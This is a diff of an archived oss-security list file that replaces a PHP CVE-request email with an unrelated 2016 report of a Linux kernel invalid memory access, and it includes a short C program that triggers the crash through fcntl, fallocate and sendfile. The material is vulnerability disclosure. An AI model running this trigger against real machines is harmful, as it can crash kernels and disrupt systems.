@@ -1,30 +1,51 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/03/10/5
-Message-ID: <20160310094228.GD4470@suse.de>
-Date: Thu, 10 Mar 2016 10:42:28 +0100
-From: Marcus Meissner <meissner@...e.de>
-To: OSS Security List <oss-security@...ts.openwall.com>, security@....net, cve-assign@...re.org
-Subject: CVE Request: PHP last release security issues
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/10/11/2
+Message-ID: <CAFkTriL_sGQ=0ym3ALDXjWMYNJxKC3UH02Lx7v9Zj_CsX9NOiA@mail.gmail.com>
+Date: Tue, 11 Oct 2016 22:22:48 +0800
+From: Marco Grassi <marco.gra@...il.com>
+To: oss-security@...ts.openwall.com
+Cc: cve-assign@...re.org
+Subject: linux kernel do_blockdev_direct_IO invalid memory access
 Content-Type: text/plain; charset=utf-8
 
-Hi,
+Hello,
 
-PHP released a round of security updates, but no CVEs have apparently been assigned.
+I posted this to ask feedback on security at kernel dot org, but I think my
+mail got bounced back. Not sure if from the mailing list or from some
+single recipient.
 
-from http://php.net/ChangeLog-7.php#7.0.4
+Anyway reposting here,
 
-	https://bugs.php.net/bug.php?id=71610	Type Confusion Vulnerability - SOAP / make_http_soap_request()
+the following program will cause a invalid memory access
 
-from http://php.net/ChangeLog-5.php#5.6.19
-and http://php.net/ChangeLog-5.php#5.5.33
+BUG: KASAN: wild-memory-access on address 0005080000000000
 
-	https://bugs.php.net/bug.php?id=71498	Out-of-Bound Read in phar_parse_zipfile()
-	https://bugs.php.net/bug.php?id=71587	Use-After-Free / Double-Free in WDDX Deserialize
+See this link for the full sanitizer report, stacktrace and trigger poc
 
-There are more bugs in the release announcements with trigger words like
-integer overflow or use-after-free, but several if not all of those need
-specific PHP code, so basically self-exploitation.
+https://gist.github.com/marcograss/40850adb3c599ac38e0beac31617d56b
 
-Perhaps the PHP security team can fill in if I missed some or one of the above is not an issue.
+tested on current master, with KASAN.
 
-Ciao, Marcus
+Marco
+
+---
+
+#include <sys/syscall.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#define _GNU_SOURCE
+#include <fcntl.h>
+#include <sys/sendfile.h>
+
+int main()
+{
+  int ret = 0;
+  int fd = open("./hurrdurr", O_APPEND|O_RDWR|0x40);
+  ret = fcntl(fd, 4, 0x44000, 0, 0, 0);
+  ret = fallocate(fd, 0, 0x21, 0xafa6);
+  off_t offset = 0;
+  ret = sendfile(fd, fd, &offset, 0x800);
+  return 0;
+}
+
